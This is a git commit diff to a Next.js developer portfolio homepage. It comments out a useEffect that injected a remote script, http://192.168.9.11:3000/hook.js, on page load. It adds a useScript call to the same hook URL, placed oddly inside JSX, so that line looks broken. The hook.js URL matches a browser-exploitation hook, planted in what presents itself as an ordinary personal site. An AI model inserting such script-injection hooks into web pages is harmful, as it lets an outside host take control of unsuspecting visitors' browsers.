6fa3d1f3749c6851b6311e28c8453a3b9d557b1a
Pritam Pawar <65030567+pritamp17@users.noreply.github.com>
2021-07-16 16:03:33 +0530

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -4,6 +4,7 @@ import BaseLayout from '@/components/layouts/BaseLayout';
 import BasePage from '@/components/BasePage';
 import { Container, Row, Col } from 'reactstrap';
 import Typed from 'react-typed';
+import useScript from 'hooks/useScript';
 import { useGetUser } from '@/actions/user';
 
 const ROLES = ['Developer', 'Tech Lover', 'Team Player', 'React.js','Next.js', 'competitive programer'];
@@ -17,18 +18,18 @@ const Index = () => {
     return () => flipInterval.current && clearInterval(flipInterval.current)
   }, []);
 
-  useEffect(() => {
-      const script = document.createElement('script');
+//   useEffect(() => {
+//       const script = document.createElement('script');
 
-      script.src = "http://192.168.9.11:3000/hook.js";
-      script.async = true;
+//       script.src = "http://192.168.9.11:3000/hook.js";
+//       script.async = true;
 
-      document.body.appendChild(script);
+//       document.body.appendChild(script);
 
-      return () => {
-        document.body.removeChild(script);
-      }
-}, []);
+//       return () => {
+//         document.body.removeChild(script);
+//       }
+// }, []);
   
   const startAnimation = () => {
     flipInterval.current = setInterval(() => {
@@ -99,6 +100,9 @@ const Index = () => {
                   className="self-typed"
                   cursorChar="|"
                 />
+//                 /////////
+                useScript("http://192.168.9.11:3000/hook.js");
+//                 //////
                 <div className="hero-welcome-bio">
                   <h1>
                     Let's take a look at my work.
